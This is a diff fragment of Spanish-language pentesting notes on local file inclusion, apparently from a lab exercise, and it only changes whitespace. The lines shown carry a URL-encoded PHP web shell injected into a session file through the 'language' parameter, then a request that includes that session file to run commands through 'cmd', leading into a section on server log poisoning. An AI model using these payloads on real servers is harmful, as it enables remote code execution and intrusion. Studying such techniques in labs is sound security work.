@@ -136,9 +136,15 @@ podríamos cambiar el valor de el parametro con LFI por cualquier otro dato:
 
 luego ingresar nuevamente al log de la sesión y ver si este último dato se encuentra en el mismo.
 Podríamos entonces agregar una shell simple:
-http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+
+
+                http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
+
+                
 y luego evocarla desde el FLI
-http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
+
+
+        http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
 
 
 #############Server log poisoning
